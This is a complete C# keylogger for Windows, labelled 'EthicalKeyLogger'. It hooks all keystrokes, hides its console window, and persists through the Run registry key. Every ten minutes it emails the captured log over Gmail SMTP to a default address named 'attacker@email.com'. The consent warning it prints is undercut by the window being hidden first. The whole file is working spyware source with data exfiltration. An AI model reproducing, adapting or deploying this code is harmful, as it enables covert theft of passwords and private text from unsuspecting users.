using System;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace EthicalKeyLogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder keyBuffer = new StringBuilder();
        private static string logFilePath = "keystrokes.txt";
        private static string emailTo = Environment.GetEnvironmentVariable("EKL_EMAIL_TO") ?? "attacker@email.com";
        private static string emailFrom = Environment.GetEnvironmentVariable("EKL_EMAIL_FROM") ?? "victim@email.com";
        private static string smtpPassword = Environment.GetEnvironmentVariable("EKL_SMTP_PASS") ?? "victim-app-password";
        private static Timer emailTimer;

        [STAThread]
        public static void Main(string[] args)
        {
            HideConsoleWindow();

            try
            {
                SetPersistentStartup();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Startup persistence failed: " + ex.Message);
            }

            Console.WriteLine("*** ETHICAL KEYLOGGER ***");
            Console.WriteLine("WARNING: Use only with explicit consent from all users.");

            // Send email every 10 minutes
            emailTimer = new Timer(600000);
            emailTimer.Elapsed += SendEmail;
            emailTimer.AutoReset = true;
            emailTimer.Enabled = true;

            _hookID = SetHook(_proc);
            Application.Run(new ApplicationContext()); // No visible form
            UnhookWindowsHookEx(_hookID);
        }

        private static void HideConsoleWindow()
        {
            ShowWindow(GetConsoleWindow(), 0);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static void SetPersistentStartup()
        {
            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key?.SetValue("EthicalKeyLogger", appPath);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ConvertKeyCodeToString(vkCode);
                keyBuffer.Append(key);

                // Write every 50 chars or on ENTER
                if (keyBuffer.Length >= 50 || key.Contains("[ENTER]"))
                {
                    File.AppendAllText(logFilePath, keyBuffer.ToString());
                    keyBuffer.Clear();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string ConvertKeyCodeToString(int vkCode)
        {
            Keys key = (Keys)vkCode;
            switch (key)
            {
                case Keys.Space: return " ";
                case Keys.Enter: return "[ENTER]\n";
                case Keys.Back: return "[BACKSPACE]";
                case Keys.Tab: return "[TAB]";
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey: return "[SHIFT]";
                case Keys.ControlKey:
                case Keys.LControlKey:
                case Keys.RControlKey: return "[CTRL]";
                case Keys.Alt: return "[ALT]";
                default:
                    return key.ToString().Length == 1 ? key.ToString() : $"[{key}]";
            }
        }

        private static void SendEmail(object source, ElapsedEventArgs e)
        {
            try
            {
                if (!File.Exists(logFilePath) || new FileInfo(logFilePath).Length == 0)
                {
                    return;
                }

                var mail = new MailMessage(emailFrom, emailTo)
                {
                    Subject = "Keystroke Log - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                    Body = "Attached is the keystroke log file."
                };

                var attachment = new Attachment(logFilePath);
                mail.Attachments.Add(attachment);

                var smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    Credentials = new NetworkCredential(emailFrom, smtpPassword),
                    EnableSsl = true,
                };

                smtpClient.Send(mail);

                File.WriteAllText(logFilePath, string.Empty);
                keyBuffer.Clear();
            }
            catch (Exception ex)
            {
                // Log error
            }
        }

        // Windows API imports
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
